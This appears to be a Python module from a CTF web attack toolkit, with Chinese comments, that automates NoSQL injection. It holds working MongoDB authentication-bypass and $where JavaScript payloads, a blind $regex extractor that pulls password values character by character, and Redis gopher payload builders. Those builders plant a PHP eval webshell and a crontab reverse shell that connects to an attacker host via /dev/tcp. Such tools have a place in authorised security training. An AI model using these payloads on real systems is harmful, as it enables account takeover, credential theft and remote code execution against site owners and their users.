"""
CTF Web Toolkit - NoSQL Injection Module
支持：
  - MongoDB 认证绕过
  - MongoDB 操作符注入 ($ne, $gt, $regex, $where)
  - 盲注数据提取（逐字符 + 正则）
  - Redis / CouchDB 注入辅助
"""

import json
from typing import Optional, List, Dict
from core.requester import Requester
from core.utils import ok, info, warn, err, found, section


# ── MongoDB 认证绕过 Payload ──────────────────
MONGO_AUTH_BYPASS_JSON = [
    # $ne 操作符
    {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
    # $gt 操作符
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    # $regex 操作符
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    # $where 操作符
    {"username": {"$where": "this.username.length > 0"},
     "password": {"$where": "this.password.length > 0"}},
]

# URL/表单参数形式的 MongoDB 注入
MONGO_AUTH_BYPASS_PARAM = [
    # 方括号操作符语法
    ("username[$ne]", "invalid", "password[$ne]", "invalid"),
    ("username[$gt]", "", "password[$gt]", ""),
    ("username[$regex]", ".*", "password[$regex]", ".*"),
    ("username[$exists]", "true", "password[$exists]", "true"),
]

# $where JS 注入 payload（盲注）
MONGO_WHERE_PAYLOADS = [
    # 始终为真
    "';return true;//",
    "';return true;var a='",
    "1;return true;",
    # 睡眠（时间盲注）
    "';sleep(3000);return true;//",
    "';var d=new Date();do{var x=new Date();}while(x-d<3000);return true;//",
]


class MongoInjection:
    """MongoDB 注入检测与利用"""

    def __init__(self, requester: Requester):
        self.req = requester

    def auth_bypass_json(self, url: str,
                         user_field: str = "username",
                         pass_field: str = "password",
                         extra_data: Optional[Dict] = None) -> bool:
        """
        JSON 请求体 MongoDB 认证绕过
        目标接口接受 application/json 请求体
        """
        section("MongoDB 认证绕过 (JSON)")
        for payload in MONGO_AUTH_BYPASS_JSON:
            body = {user_field: payload[user_field if user_field in payload else "username"],
                    pass_field: payload[pass_field if pass_field in payload else "password"]}
            body.update(extra_data or {})
            try:
                resp = self.req.post(url, json=body)
                if resp and _looks_logged_in(resp.text, resp.status_code):
                    found("MongoDB 认证绕过", json.dumps(body)[:100])
                    return True
                info(f"  尝试: {json.dumps(body)[:60]} -> {resp.status_code if resp else '失败'}")
            except Exception as e:
                err(f"请求失败: {e}")
        info("JSON 认证绕过未成功")
        return False

    def auth_bypass_param(self, url: str,
                          user_field: str = "username",
                          pass_field: str = "password",
                          extra_data: Optional[Dict] = None) -> bool:
        """
        表单参数 MongoDB 认证绕过（使用 [] 操作符语法）
        """
        section("MongoDB 认证绕过 (参数)")
        for uf, uv, pf, pv in MONGO_AUTH_BYPASS_PARAM:
            data = {
                uf.replace("username", user_field): uv,
                pf.replace("password", pass_field): pv,
            }
            data.update(extra_data or {})
            resp = self.req.post(url, data=data)
            if resp and _looks_logged_in(resp.text, resp.status_code):
                found("MongoDB 认证绕过", str(data)[:100])
                return True
            info(f"  尝试: {uf}={uv!r} -> {resp.status_code if resp else '失败'}")
        info("参数认证绕过未成功")
        return False

    def detect_injection(self, url: str, param: str,
                         method: str = "GET",
                         baseline_value: str = "admin") -> bool:
        """检测参数是否存在 MongoDB 注入"""
        section(f"MongoDB 注入检测: {param}")
        # 正常请求基线
        resp_base = _send(self.req, url, param, baseline_value, method)
        if not resp_base:
            return False
        base_len = len(resp_base.text)
        base_status = resp_base.status_code

        # 尝试操作符
        operators = [
            f"{param}[$ne]=__XXXX__",  # 应该返回更多结果
            f"{param}[$regex]=.*",
            f"{param}[$where]=this.{param}.length>0",
        ]
        for op_payload in [{"$ne": "invalid_xyz"}, {"$gt": ""}, {"$regex": ".*"}]:
            # GET 方式：直接在 URL 加操作符参数
            resp = _send_operator(self.req, url, param, op_payload, method)
            if resp:
                diff = abs(len(resp.text) - base_len)
                if resp.status_code != base_status or diff > 100:
                    found("MongoDB 注入", f"{param}: {op_payload}")
                    return True

        info("未检测到 MongoDB 注入")
        return False

    def extract_field(self, url: str, param: str,
                      target_field: str = "password",
                      method: str = "GET",
                      max_length: int = 50) -> Optional[str]:
        """
        通过 $regex 盲注提取字段值（逐字符匹配）
        适用于 GET/POST 参数注入
        """
        section(f"MongoDB 盲注提取: {target_field}")
        charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*_-"
        result = ""

        for pos in range(max_length):
            found_char = False
            for c in charset:
                # 构造 regex 前缀匹配
                prefix = result + c
                payload = {"$regex": f"^{prefix}"}
                resp = _send_operator(self.req, url, param, payload, method)
                if resp and _looks_true(resp.text, resp.status_code):
                    result += c
                    print(f"\r  [*] 提取中: {result}", end="", flush=True)
                    found_char = True
                    break
            if not found_char:
                break

        print()
        if result:
            found(target_field, result)
        return result if result else None

    def time_based_detect(self, url: str, param: str,
                          method: str = "GET",
                          sleep_ms: int = 3000) -> bool:
        """通过 $where 睡眠注入判断是否存在注入"""
        section("MongoDB 时间盲注检测")
        import time
        normal_payload = "admin"
        start = time.time()
        _send(self.req, url, param, normal_payload, method)
        normal_time = time.time() - start

        sleep_payload = f"';var d=new Date();do{{var x=new Date();}}while(x-d<{sleep_ms});return true;//"
        start = time.time()
        _send(self.req, url, param, sleep_payload, method)
        sleep_time = time.time() - start

        delay = sleep_time - normal_time
        if delay > sleep_ms / 1000 * 0.8:
            found("时间盲注", f"延迟={delay:.2f}s (注入了 {sleep_ms}ms 睡眠)")
            return True
        info(f"无明显时间差 (正常={normal_time:.2f}s 注入={sleep_time:.2f}s)")
        return False

    def dump_collection_names(self, url: str, param: str,
                              method: str = "GET") -> List[str]:
        """通过 $where + length 推断集合数量（辅助）"""
        section("MongoDB 集合探测")
        # 常见集合名
        common_collections = [
            "users", "user", "admin", "accounts", "members",
            "customers", "orders", "products", "sessions", "tokens",
            "passwords", "credentials", "flags", "secret", "notes",
        ]
        found_cols = []
        for col in common_collections:
            payload = {"$where": f"db.{col}.count()>0"}
            resp = _send_operator(self.req, url, param, payload, method)
            if resp and _looks_true(resp.text, resp.status_code):
                ok(f"  可能存在集合: {col}")
                found_cols.append(col)
        return found_cols


# ── Redis 命令注入 ────────────────────────────
class RedisInjection:
    """Redis 命令注入辅助（通常配合 SSRF 使用）"""

    @staticmethod
    def gopher_payload(host: str = "127.0.0.1", port: int = 6379,
                       commands: Optional[List[str]] = None) -> str:
        """
        构造 Gopher 协议的 Redis 命令注入 Payload
        每条命令格式为 Redis 协议 (RESP)
        """
        if commands is None:
            commands = ["INFO"]

        def encode_resp(cmd: str) -> str:
            parts = cmd.split()
            resp = f"*{len(parts)}\r\n"
            for p in parts:
                resp += f"${len(p)}\r\n{p}\r\n"
            return resp

        raw = "".join(encode_resp(c) for c in commands)
        encoded = "".join(f"%{ord(c):02x}" for c in raw)
        return f"gopher://{host}:{port}/_{encoded}"

    @staticmethod
    def webshell_payload(host: str = "127.0.0.1", port: int = 6379,
                         web_path: str = "/var/www/html",
                         filename: str = "shell.php",
                         password: str = "cmd") -> str:
        """通过 Redis config set + bgsave 写 Webshell"""
        shell = f"<?php @eval($_POST['{password}']);?>"
        commands = [
            f"CONFIG SET dir {web_path}",
            f"CONFIG SET dbfilename {filename}",
            f"SET xxe_shell {shell}",
            "BGSAVE",
        ]
        return RedisInjection.gopher_payload(host, port, commands)

    @staticmethod
    def crontab_payload(host: str = "127.0.0.1", port: int = 6379,
                        lhost: str = "", lport: int = 4444) -> str:
        """通过 Redis 写 crontab 反弹 Shell"""
        cron = f"\n\n*/1 * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n\n"
        commands = [
            "CONFIG SET dir /var/spool/cron",
            "CONFIG SET dbfilename root",
            f"SET payload {cron}",
            "BGSAVE",
        ]
        return RedisInjection.gopher_payload(host, port, commands)


# ── CouchDB 注入 ──────────────────────────────
def build_couchdb_mangled_json(username: str = "admin") -> Dict:
    """CouchDB Mango 查询注入"""
    return {
        "selector": {
            "name": {"$gt": ""},
            "password": {"$gt": ""},
        },
        "fields": ["name", "password"],
        "limit": 10,
    }


# ── 内部辅助 ─────────────────────────────────
def _send(req: Requester, url: str, param: str,
          value: str, method: str):
    try:
        if method.upper() == "GET":
            return req.get(url, params={param: value})
        else:
            return req.post(url, data={param: value})
    except Exception as e:
        err(f"请求失败: {e}")
        return None


def _send_operator(req: Requester, url: str, param: str,
                   operator: dict, method: str):
    """发送操作符注入，自动处理 JSON 和参数格式"""
    try:
        if method.upper() == "POST":
            # JSON body
            return req.post(url, json={param: operator})
        else:
            # GET 参数 MongoDB 风格 param[$ne]=xxx
            op_key = list(operator.keys())[0]
            op_val = list(operator.values())[0]
            param_key = f"{param}[{op_key}]"
            return req.get(url, params={param_key: op_val})
    except Exception as e:
        err(f"请求失败: {e}")
        return None


def _looks_logged_in(text: str, status: int) -> bool:
    """判断响应是否表示登录成功"""
    if status in [200, 302]:
        success_kw = ["dashboard", "welcome", "logout", "profile",
                      "success", "token", "logged", "home",
                      "登录成功", "欢迎", "首页", "个人中心"]
        fail_kw = ["invalid", "incorrect", "wrong", "failed",
                   "密码错误", "用户名", "登录失败", "不存在"]
        text_lower = text.lower()
        has_success = any(k in text_lower for k in success_kw)
        has_fail = any(k in text_lower for k in fail_kw)
        return has_success and not has_fail
    return False


def _looks_true(text: str, status: int) -> bool:
    """判断响应是否为真条件（用于盲注）"""
    return status == 200 and len(text.strip()) > 0
